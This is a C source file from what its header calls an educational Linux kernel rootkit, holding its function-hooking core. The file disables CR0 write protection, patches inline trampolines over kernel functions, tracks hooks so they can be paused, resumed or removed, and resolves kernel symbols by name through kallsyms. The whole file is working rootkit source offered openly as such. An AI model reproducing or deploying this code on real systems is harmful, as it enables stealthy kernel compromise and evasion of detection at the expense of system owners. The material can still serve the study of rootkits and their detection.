/* 
 * Copyright 2014-2015 Jerry Han (hanj4096@gmail.com)
 *
 * This program is free software; you can redistribute it and/or modify   
 * it under the terms of the GNU General Public License version 3 as 
 * published by the Free Software Foundation.
 *
 * Note: 
 * This kernel rootkit is just for educational purpose and it shouldn't
 * be used for any illegal activities, use this at your own risk.
 */

#include <linux/slab.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>

#include "common.h"

#if defined(_CONFIG_X86_)
    #define HIJACK_SIZE 6
#elif defined(_CONFIG_X86_64_)
    #define HIJACK_SIZE 12
#endif

struct sym_hook 
{
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

struct ksym 
{
    char *name;
    unsigned long addr;
};

LIST_HEAD(hooked_syms);

#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
    #ifdef __ASSEMBLY__
    #define _AC(X,Y)    X
    #define _AT(T,X)    X
    #else
    #define __AC(X,Y)   (X##Y)
    #define _AC(X,Y)    __AC(X,Y)
    #define _AT(T,X)    ((T)(X))
    #endif
    #define _BITUL(x)   (_AC(1,UL) << (x))
    #define _BITULL(x)  (_AC(1,ULL) << (x))
    #define X86_CR0_WP_BIT          16 /* Write Protect */
    #define X86_CR0_WP              _BITUL(X86_CR0_WP_BIT)
#endif

inline unsigned long disable_wp(void)
{
    unsigned long cr0;

    preempt_disable();
    barrier();

    cr0 = read_cr0();
    write_cr0(cr0 & ~X86_CR0_WP);
    return cr0;
}

inline void restore_wp(unsigned long cr0)
{
    write_cr0(cr0);

    barrier();
    preempt_enable();
}

void hijack_start(void *target, void *new)
{
    struct sym_hook *sa;
    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];

    #if defined(_CONFIG_X86_)
    unsigned long o_cr0;
    memcpy(n_code, "\x68\x00\x00\x00\x00\xc3", HIJACK_SIZE);
    *(unsigned long *)&n_code[1] = (unsigned long)new;
    #elif defined(_CONFIG_X86_64_)
    unsigned long o_cr0;
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;
    #endif

    DEBUG("Hooking function 0x%p with 0x%p\n", target, new);

    memcpy(o_code, target, HIJACK_SIZE);

    o_cr0 = disable_wp();
    memcpy(target, n_code, HIJACK_SIZE);
    restore_wp(o_cr0);

    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
    if(!sa)
        return;

    sa->addr = target;
    memcpy(sa->o_code, o_code, HIJACK_SIZE);
    memcpy(sa->n_code, n_code, HIJACK_SIZE);

    list_add(&sa->list, &hooked_syms);
}

void hijack_pause(void *target)
{
    struct sym_hook *sa;

    DEBUG("Pausing function hook 0x%p\n", target);

    list_for_each_entry(sa, &hooked_syms, list) {
        if(target == sa->addr) {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);
        }
    }
}

void hijack_resume ( void *target )
{
    struct sym_hook *sa;

    DEBUG("Resuming function hook 0x%p\n", target);

    list_for_each_entry(sa, &hooked_syms, list) {
        if ( target == sa->addr ) {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->n_code, HIJACK_SIZE);
            restore_wp(o_cr0);
        }
    }
}

void hijack_stop(void *target)
{
    struct sym_hook *sa;

    DEBUG("Unhooking function 0x%p\n", target);

    list_for_each_entry(sa, &hooked_syms, list) {
        if(target == sa->addr) {
            unsigned long o_cr0 = disable_wp();
            memcpy(target, sa->o_code, HIJACK_SIZE);
            restore_wp(o_cr0);

            list_del(&sa->list);
            kfree(sa);
            break;
        }
    }
}

char *strnstr(const char *haystack, const char *needle, size_t n)
{
    char *s = strstr(haystack, needle);

    if(s == NULL)
        return NULL;

    if((s - haystack + strlen(needle)) <= n)
        return s;
    else
        return NULL;
}

void *search_linear(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
{
    char *p;

    for(p = (char *)haystack; p <= ((char *)haystack + haystack_size - needle_size); p++)
        if(memcmp(p, needle, needle_size) == 0)
            return (void *)p;

    return NULL;
}

int find_ksym(void *data, const char *name, struct module *module, unsigned long address)
{
    struct ksym *ksym = (struct ksym *)data;
    char *target = ksym->name;

    if(strncmp(target, name, KSYM_NAME_LEN) == 0) {
        ksym->addr = address;
        return 1;
    }

    return 0;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name)
{
    unsigned long symbol = 0;
    struct ksym ksym;

    ksym.name = name;
    ksym.addr = 0;
    kallsyms_on_each_symbol(&find_ksym, &ksym);
    symbol = ksym.addr;

    return symbol;
}
#endif
